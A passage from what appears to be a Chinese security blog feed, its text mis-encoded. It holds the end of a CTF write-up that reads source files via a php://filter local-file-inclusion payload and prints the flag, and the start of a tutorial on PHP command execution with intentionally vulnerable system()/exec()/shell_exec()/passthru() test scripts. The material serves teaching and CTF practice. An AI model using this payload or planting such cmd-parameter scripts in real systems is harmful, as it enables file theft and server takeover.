href="#3-3-å°è¯•åŒ…å«å½“å‰é¡µçš„æºä»£ç -php-filter" class="headerlink" title="3.3 å°è¯•åŒ…å«å½“å‰é¡µçš„æºä»£ç  php://filter"></a>3.3 å°è¯•åŒ…å«å½“å‰é¡µçš„æºä»£ç  php://filter</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201117439.png" style="zoom:80%;"><p>è¿”å›äº†ä¸€ä¸ªè¶…å¤§å“åº”ï¼Œæœ‰ç‚¹ä¸å¯¹åŠ²ã€‚å°è¯•ç”¨<code>php://filter/read</code>è¯»å–index.phpçš„æºä»£ç </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201445769.png" style="zoom:80%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PG1ldGEgY2hhcnNldD0idXRmOCI+Cjw/cGhwCmVycm9yX3JlcG9ydGluZygwKTsKJGZpbGUgPSAkX0dFVFsiZmlsZSJdOwppZihzdHJpc3RyKCRmaWxlLCJwaHA6Ly9pbnB1dCIpIHx8IHN0cmlzdHIoJGZpbGUsInppcDovLyIpIHx8IHN0cmlzdHIoJGZpbGUsInBoYXI6Ly8iKSB8fCBzdHJpc3RyKCRmaWxlLCJkYXRhOiIpKXsKCWV4aXQoJ2hhY2tlciEnKTsKfQppZigkZmlsZSl7CglpbmNsdWRlKCRmaWxlKTsKfWVsc2V7CgllY2hvICc8YSBocmVmPSI/ZmlsZT1mbGFnLnBocCI+dGlwczwvYT4nOwp9Cj8+Cg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç ä¹‹åï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æä»£ç ï¼Œå‘ç°banæ‰äº†php://inputã€zip://ã€phar://å’Œdataä¼ªåè®®ã€‚</p><p>ä½†æ˜¯è¿˜æ˜¯æ²¡æ‰¾åˆ°flagã€‚</p><p>é‚£å†çœ‹ä¸€ä¸‹flag.php</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201830878.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201806597.png" style="zoom:80%;"><p>è§£ç ä¹‹åå¯ä»¥çœ‹åˆ°flagè—åœ¨flag.phpçš„æ³¨é‡Šä¸­ã€‚</p><h2 id="3-4-flag"><a href="#3-4-flag" class="headerlink" title="3.4 flag"></a>3.4 flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>769181eb-6984-411b-85bc-5ad97bf5093c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™ä¸€å…³çš„æ ¸å¿ƒç‚¹æ˜¯é€šè¿‡<code>php://filter</code>ä¼ªåè®®è¯»å–åç«¯çš„æºä»£ç ï¼Œæ ¸å¿ƒpayload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œæ¼æ´</title>
      <link href="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/"/>
      <url>/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å‘½ä»¤æ‰§è¡Œæ¼æ´æ¦‚è¿°"><a href="#ä¸€ã€å‘½ä»¤æ‰§è¡Œæ¼æ´æ¦‚è¿°" class="headerlink" title="ä¸€ã€å‘½ä»¤æ‰§è¡Œæ¼æ´æ¦‚è¿°"></a>ä¸€ã€å‘½ä»¤æ‰§è¡Œæ¼æ´æ¦‚è¿°</h1><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯ä¸€ç§ä¸¥é‡çš„ç½‘ç»œå®‰å…¨æ¼æ´ã€‚å½“åº”ç”¨ç¨‹åºæœªèƒ½æ­£ç¡®å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå°†æ¶æ„æ„é€ çš„è¾“å…¥å½“ä½œæ“ä½œç³»ç»Ÿçš„å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯ã€ç¯¡æ”¹æ•°æ®ã€å®‰è£…æ¶æ„è½¯ä»¶ï¼Œç”šè‡³å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p><h2 id="1-1-å‘½ä»¤æ‰§è¡ŒVSè¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#1-1-å‘½ä»¤æ‰§è¡ŒVSè¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="1.1 å‘½ä»¤æ‰§è¡ŒVSè¿œç¨‹ä»£ç æ‰§è¡Œ"></a>1.1 å‘½ä»¤æ‰§è¡ŒVSè¿œç¨‹ä»£ç æ‰§è¡Œ</h2><p>ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´éƒ½æ˜¯å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç æˆ–å‘½ä»¤çš„å®‰å…¨æ¼æ´ç±»å‹ï¼Œä½†å®ƒä»¬å­˜åœ¨å¤šæ–¹é¢çš„åŒºåˆ«ï¼š</p><h3 id="1-1-1-æ‰§è¡Œç¯å¢ƒ"><a href="#1-1-1-æ‰§è¡Œç¯å¢ƒ" class="headerlink" title="1.1.1 æ‰§è¡Œç¯å¢ƒ"></a>1.1.1 æ‰§è¡Œç¯å¢ƒ</h3><ul><li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šç›´æ¥ä¸æ“ä½œç³»ç»Ÿäº¤äº’ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æ”»å‡»è€…å¯ä»¥è¿è¡Œåƒ<code>ls</code>ï¼ˆåˆ—å‡ºç›®å½•å†…å®¹ï¼‰ã€<code>cat</code>ï¼ˆæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼‰ã€<code>rm</code>ï¼ˆåˆ é™¤æ–‡ä»¶ï¼‰ç­‰ç³»ç»Ÿå‘½ä»¤ã€‚</li><li><strong>ä»£ç æ‰§è¡Œ</strong>ï¼šå…è®¸æ”»å‡»è€…æ‰§è¡Œç¼–ç¨‹è¯­è¨€çš„ä»£ç ï¼Œå¦‚PHPã€Pythonã€Javaç­‰ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´æ‰§è¡Œæ¶æ„è„šæœ¬æˆ–ç¨‹åºä»£ç ï¼Œå®ç°æ›´å¤æ‚çš„æ”»å‡»é€»è¾‘ï¼Œå¦‚åˆ›å»ºæ¶æ„æ–‡ä»¶ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ã€çªƒå–æ•°æ®ç­‰ã€‚</li></ul><h3 id="1-1-2-æ¼æ´æˆå› "><a href="#1-1-2-æ¼æ´æˆå› " class="headerlink" title="1.1.2 æ¼æ´æˆå› "></a>1.1.2 æ¼æ´æˆå› </h3><ul><li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šé€šå¸¸ç”±äºåº”ç”¨ç¨‹åºåœ¨è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤å’ŒéªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥æ¶æ„å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°ç³»ç»Ÿå‘½ä»¤ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¾“å…¥åˆ†å·ã€ç®¡é“ç¬¦ç­‰ç‰¹æ®Šå­—ç¬¦æ¥åˆ†éš”å’Œæ³¨å…¥é¢å¤–çš„å‘½ä»¤ã€‚</li><li><strong>ä»£ç æ‰§è¡Œ</strong>ï¼šå¯èƒ½ç”±å¤šç§åŸå› å¼•èµ·ï¼Œå¦‚åº”ç”¨ç¨‹åºä¸­å­˜åœ¨ä¸å®‰å…¨çš„ä»£ç è§£æå™¨ã€ååºåˆ—åŒ–æ¼æ´ç­‰ã€‚æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„è¾“å…¥æ•°æ®ï¼Œè¯±å¯¼åº”ç”¨ç¨‹åºæ‰§è¡Œæ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºé”™è¯¯åœ°å°†ç”¨æˆ·è¾“å…¥å½“ä½œä»£ç æ¥æ‰§è¡Œï¼Œæˆ–è€…åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œäº†æ¶æ„ä»£ç ã€‚</li></ul><h3 id="1-1-3-æ”»å‡»å½±å“"><a href="#1-1-3-æ”»å‡»å½±å“" class="headerlink" title="1.1.3 æ”»å‡»å½±å“"></a>1.1.3 æ”»å‡»å½±å“</h3><ul><li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ç›´æ¥å¯¹ç³»ç»Ÿè¿›è¡Œæ“ä½œï¼Œå¦‚è·å–ç³»ç»Ÿä¿¡æ¯ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ã€ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ç­‰ã€‚ä½†å…¶æ‰§è¡Œçš„å‘½ä»¤é€šå¸¸å—åˆ°æ“ä½œç³»ç»Ÿçš„é™åˆ¶ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡ä¸€å®šçš„ç³»ç»ŸçŸ¥è¯†æ‰èƒ½æœ‰æ•ˆåˆ©ç”¨ã€‚</li><li><strong>ä»£ç æ‰§è¡Œ</strong>ï¼šæ”»å‡»è€…å¯ä»¥æ‰§è¡Œæ›´å¤æ‚çš„é€»è¾‘ï¼Œå¦‚åˆ›å»ºæ¶æ„è¿›ç¨‹ã€ä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ã€çªƒå–æ•æ„Ÿæ•°æ®ç­‰ã€‚ç”±äºä»£ç æ‰§è¡Œçš„çµæ´»æ€§æ›´é«˜ï¼Œæ”»å‡»è€…å¯ä»¥å®ç°æ›´å¤æ‚çš„æ”»å‡»åœºæ™¯ï¼Œå¯¹ç³»ç»Ÿçš„å¨èƒæ›´å¤§ã€‚</li></ul><p>æ€»ä¹‹ï¼šOSå‘½ä»¤æ³¨å…¥{æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥} vs PHPä»£ç æ³¨å…¥{PHP ä»£ç åœ¨æœåŠ¡å™¨æ‰§è¡Œ}çš„æ ¸å¿ƒåŒºåˆ«ï¼šæ³¨å…¥çš„å†…å®¹ä¸åŒï¼Œè¯­è¨€ç±»æ³¨å…¥æ³¨å…¥çš„æ˜¯è¯­è¨€ä»£ç ï¼Œè¿è¡Œåœ¨åº”ç”¨ç¨‹åºä¸­ï¼›å‘½ä»¤æ³¨å…¥æ³¨å…¥çš„æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œè¿è¡Œåœ¨æ“ä½œç³»ç»Ÿä¸­ã€‚</p><h2 id="1-2-æ¼æ´åŸç†"><a href="#1-2-æ¼æ´åŸç†" class="headerlink" title="1.2 æ¼æ´åŸç†"></a>1.2 æ¼æ´åŸç†</h2><p>ç¨‹åºå‘˜ä½¿ç”¨è„šæœ¬è¯­è¨€(æ¯”å¦‚PHP)å¼€å‘åº”ç”¨ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œè„šæœ¬è¯­è¨€å¼€å‘ååˆ†å¿«é€Ÿã€ç®€ä»‹ï¼Œæ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿä¼´éšç€ä¸€ äº›é—®é¢˜ã€‚æ¯”å¦‚è¯´é€Ÿåº¦æ…¢ï¼Œæˆ–è€…æ— æ³•æ¥è§¦ç³»ç»Ÿåº•å±‚ï¼Œå¦‚æœæˆ‘ä»¬å¼€å‘çš„åº”ç”¨ï¼Œç‰¹åˆ«æ˜¯ä¼ä¸šçº§çš„ä¸€äº›åº”ç”¨éœ€è¦å»è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åº(ç³»ç»Ÿå‘½ä»¤æˆ–è€…exeç­‰å¯æ‰§è¡Œæ–‡ä»¶)ã€‚å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºæ—¶å°±ä¼šç”¨åˆ°ä¸€äº›ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚</p><p>åº”ç”¨åœ¨è°ƒç”¨è¿™äº›å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ—¶å€™ï¼Œå¦‚æœå°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°å‘½ä»¤è¡Œä¸­ï¼Œåœ¨æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><ul><li><p>1.ç”¨æˆ·è¾“å…¥ä½œä¸ºæ‹¼æ¥</p></li><li><p>2.æ²¡æœ‰è¶³å¤Ÿçš„è¿‡æ»¤</p></li></ul><h2 id="1-3-æ¼æ´å±å®³"><a href="#1-3-æ¼æ´å±å®³" class="headerlink" title="1.3 æ¼æ´å±å®³"></a>1.3 æ¼æ´å±å®³</h2><ul><li>1.ç»§æ‰¿WebæœåŠ¡å™¨ç¨‹åºæƒé™(Web ç”¨æˆ·æƒé™)ï¼Œå»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li><li>2.ç»§æ‰¿WebæœåŠ¡å™¨æƒé™ï¼Œè¯»å†™æ–‡ä»¶</li><li>3.åå¼¹Shellï¼ˆæœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…ï¼‰</li><li>4.æ§åˆ¶æ•´ä¸ªç½‘ç«™</li><li>5.æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨</li></ul><h1 id="äºŒã€ç›¸å…³å‡½æ•°"><a href="#äºŒã€ç›¸å…³å‡½æ•°" class="headerlink" title="äºŒã€ç›¸å…³å‡½æ•°"></a>äºŒã€ç›¸å…³å‡½æ•°</h1><h2 id="2-1-system"><a href="#2-1-system" class="headerlink" title="2.1 system()"></a>2.1 system()</h2><p>system()èƒ½å¤Ÿå°†å­—ç¬¦ä¸²ä½œä¸º0Så‘½ä»¤æ‰§è¡Œï¼Œ<code>è‡ªå¸¦è¾“å‡ºåŠŸèƒ½</code>ï¼Œç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•å›æ˜¾ã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">system.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>gb2312<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_</span> <span class="token constant">GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span><span class="token punctuation">;</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?cmd=ipconfig"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-system-å‘½ä»¤æ‰§è¡Œ"><a href="#EX-system-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="EX:system å‘½ä»¤æ‰§è¡Œ"></a>EX:system å‘½ä»¤æ‰§è¡Œ</h4><p> C:\phpstudy\WWW\command-i\system.php</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%889.55.43.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.05.19.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.05.43.png" style="zoom:45%;"></blockquote><h2 id="2-2-exec"><a href="#2-2-exec" class="headerlink" title="2.2 exec()"></a>2.2 exec()</h2><p>exec()å‡½æ•°èƒ½å°†å­—ç¬¦ä¸²ä½œä¸º0Så‘½ä»¤æ‰§è¡Œï¼Œ<code>éœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœ</code>ã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gb2312<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">' cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span> <span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"? cmd=whoami"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-exec-å‘½ä»¤æ³¨å…¥"><a href="#EX-exec-å‘½ä»¤æ³¨å…¥" class="headerlink" title="EX:exec å‘½ä»¤æ³¨å…¥"></a>EX:exec å‘½ä»¤æ³¨å…¥</h4><p>C:\phpstudy\WWW\command-i\exec.php</p><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.11.07.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2025-02-11%2017.31.32.png" style="zoom:40%;"><p>è¿”å›ç»“æœæœ‰é™ã€‚ä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p></blockquote><h2 id="2-3-shell-exec-åº”ç”¨æœ€å¹¿æ³›"><a href="#2-3-shell-exec-åº”ç”¨æœ€å¹¿æ³›" class="headerlink" title="2.3 shell_exec() åº”ç”¨æœ€å¹¿æ³›"></a>2.3 shell_exec() åº”ç”¨æœ€å¹¿æ³›</h2><p>æµ‹è¯•ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gb2312<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span> <span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?cmd=whoami"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-shell-exec-å‘½ä»¤æ³¨å…¥"><a href="#EX-shell-exec-å‘½ä»¤æ³¨å…¥" class="headerlink" title="EX:shell_exec()å‘½ä»¤æ³¨å…¥"></a>EX:shell_exec()å‘½ä»¤æ³¨å…¥</h4><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.16.28.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.17.54.png" style="zoom:55%;"><p>ç›¸æ¯”<code>exec()</code>å‡½æ•°ï¼Œè¾“å‡ºçš„ç»“æœæ›´ä¸ºå…¨é¢ã€‚</p></blockquote><h2 id="2-4-passthru"><a href="#2-4-passthru" class="headerlink" title="2.4 passthru()"></a>2.4 passthru()</h2><p><code>è‡ªå¸¦è¾“å‡º</code></p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gb2312<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span> <span class="token punctuation">;</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?cmd=whoami"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="EX-passthru-å‘½ä»¤æ³¨å…¥"><a href="#EX-passthru-å‘½ä»¤æ³¨å…¥" class="headerlink" title="EX:passthru()å‘½ä»¤æ³¨å…¥"></a>EX:passthru()å‘½ä»¤æ³¨å…¥</h4><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.20.36.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/%E6%88%AA%E5%B1%8F2021-06-28%20%E4%B8%8A%E5%8D%8810.20.49.png" style="zoom:75%;"></blockquote><h2 id="2-5-popen"><a href="#2-5-popen" class="headerlink" title="2.5 popen()"></a>2.5 popen()</h2><p>popen()ä¹Ÿèƒ½å¤Ÿæ‰§è¡Œ0Så‘½ä»¤,ä½†æ˜¯è¯¥å‡½æ•°å¹¶ä¸æ˜¯è¿”å›å‘½ä»¤ç»“æœ,è€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆã€‚</p><p>æ— è®ºè¿”å›ä»€ä¹ˆï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯å‘½ä»¤æ˜¯å¦æ‰§è¡Œã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 